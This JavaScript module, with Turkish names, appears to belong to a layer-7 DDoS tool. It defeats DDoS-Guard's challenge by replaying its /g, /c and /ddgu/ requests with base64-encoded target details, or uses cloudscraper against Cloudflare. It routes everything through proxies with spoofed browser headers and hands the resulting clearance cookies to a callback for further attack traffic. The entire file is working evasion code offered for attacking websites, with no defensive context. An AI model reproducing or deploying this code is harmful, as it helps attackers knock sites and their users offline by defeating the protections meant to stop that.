module.exports = function AntiDDoS() {
    const istek = require('request'),
        cloudscraper = require('cloudscraper');

    function kodla(string) {
        return Buffer.from(string).toString('base64');
    }

    var hSifre, uSifre, pSifre;
    hSifre = kodla(l7.parsed.protocol + '//' + l7.parsed.host);
    uSifre = kodla(l7.parsed.path);
    pSifre = kodla(l7.parsed.port || '');

    function atlama(proxy, uagent, geriÇağır, zorla, çerez) {
        if (!çerez) {
            çerez = '';
        }
        if (['5sn', 'ücretsiz'].indexOf(l7.firewall[1]) !== -1 || zorla) {
            let atlamaJar = istek.jar();
            istek.get({
                url: l7.parsed.protocol + '//ddgu.ddos-guard.net/g',
                gzip: true,
                proxy: proxy,
                jar: atlamaJar,
                headers: {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'tr-TR;q=0.9',
                    'Referer': l7.target,
                    'Origin': l7.parsed.protocol + '//' + l7.parsed.host
                }
            }, (hata, cevap, içerik) => {
                if (hata || !cevap || !içerik) {
                    return false;
                }

                istek.get({
                    url: l7.parsed.protocol + '//ddgu.ddos-guard.net/c',
                    gzip: true,
                    proxy: proxy,
                    jar: atlamaJar,
                    headers: {
                        'Connection': 'keep-alive',
                        'User-Agent': uagent,
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': l7.target,
                        Origin: l7.parsed.protocol + '//' + l7.parsed.host,
                        'Accept-Language': 'tr-TR;q=0.9'
                    }
                }, (hata, cevap, içerik) => {
                    if (hata || !cevap || !içerik) {
                        return false;
                    }

                    istek.post({
                        url: l7.parsed.protocol + '//ddgu.ddos-guard.net/ddgu/',
                        gzip: true,
                        proxy: proxy,
                        jar: atlamaJar,
                        followAllRedirects: true,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            "Referer": l7.target,
                            Origin: l7.parsed.protocol + '//' + l7.parsed.host,
                            'Accept-Language': 'tr-TR;q=0.9'
                        },
                        form: {
                            u: uSifre,
                            h: hSifre,
                            p: pSifre
                        }
                    }, (hata, cevap, içerik) => {
                        if (hata || !cevap || !içerik) {
                            return false;
                        }
                        if (içerik.indexOf('resimdeki sembolleri aşağıdaki forma girin. </div>') !== -1) {
                            console.log('[ddos-koruma] Captcha alındı, Ip rep öldü.');
                        } else {
                            geriÇağır(cevap.request.headers.cookie);
                        }
                    });
                });
            });
        } else {
            cloudscraper.get({
                url: l7.target,
                gzip: true,
                proxy: proxy,
                jar: true,
                followAllRedirects: true,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'tr-TR;q=0.9'
                }
            }, (hata, cevap, içerik) => {
                if (hata || !cevap || !içerik) {
                    return false;
                }
                if (cevap.request.headers.cookie) {
                    geriÇağır(cevap.request.headers.cookie);
                } else {
                    if (cevap.statusCode == 403 && içerik.indexOf("<title>DDOS-KORUMA</title>") !== -1) {
                        return atlama(proxy, uagent, geriÇağır, true);
                    } else {
                        return false;
                    }
                }
            });
        }
    }

    return atlama;
}
